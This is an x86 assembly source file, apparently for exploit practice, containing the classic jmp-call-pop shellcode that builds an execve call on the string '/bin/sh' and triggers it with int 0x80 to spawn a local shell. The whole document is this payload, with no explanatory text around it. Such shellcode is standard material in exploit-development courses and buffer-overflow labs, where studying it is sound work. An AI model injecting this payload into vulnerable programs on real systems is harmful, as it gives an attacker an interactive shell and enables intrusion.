Section .text

  global _start

_start:

  jmp short     callShellcode

shellcode:

  pop           esi
  xor           eax, eax
  mov byte      [esi + 7], al
  lea           ebx, [esi]
  mov long      [esi + 8], ebx
  lea           ecx, [esi + 8]
  mov long      [esi + 12], eax
  lea           edx, [esi + 12]
  mov byte      al, 0x0b
  int           0x80

callShellcode:

  Call          shellcode
  db            '/bin/shNAAAABBBB'
